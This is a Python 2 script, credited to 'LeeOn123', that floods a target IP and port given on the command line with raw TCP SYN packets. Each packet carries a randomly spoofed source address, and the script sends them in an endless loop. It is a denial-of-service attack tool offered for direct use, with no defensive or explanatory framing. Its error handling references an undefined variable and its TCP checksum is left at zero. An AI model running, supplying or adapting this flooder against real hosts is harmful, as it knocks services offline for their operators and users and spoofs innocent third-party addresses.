#!/usr/bin/env python2
'''
Code by LeeOn123
'''
import socket, sys, threading, random
from struct import *
import ipaddress
from requests import *

if len(sys.argv) <= 2:
    print("Usage: python "+ sys.argv[0]+ " <target ip> <port>")
    sys.exit()

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1

def random_ipv4():
    return ipaddress.IPv4Address._string_from_ip_int(
        random.randint(0, MAX_IPV4)
    )

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
except:
    print ('Socket could not be created. Error Code : ' + str(msg[0]) +' Message ' + msg[1])
    sys.exit()
 
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

dest_ip = socket.gethostbyname(str(sys.argv[1]))

def header(source_ip):
    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20
    id = random.randint(1,65535)
    frag_off = 0
    ttl = random.randint(1,255)
    protocol = socket.IPPROTO_TCP
    check = 10 
    saddr =socket.inet_aton ( source_ip )
    daddr = socket.inet_aton ( dest_ip )
    ihl_version = (version << 4) + ihl
    global ip_header
    ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

def tcp(source_ip):
    header(source_ip)
    source = random.randint(36000, 65535)
    dest = int(sys.argv[2])
    seq = 0
    ack_seq = 0
    doff = 5
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = socket.htons (5840)
    check = 0
    urg_ptr = 0
    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) +(ack << 4) + (urg << 5)
    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    psh = pack('!4s4sBBH', source_address , dest_address , placeholder , protocol , tcp_length);
    psh = psh + tcp_header;
    tcp_checksum = 0
    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
    global packet
    packet = ip_header + tcp_header

def run():
    while True:
        source_ip = random_ipv4()
        tcp(source_ip)
        s.sendto(packet, (dest_ip , 0))
run()
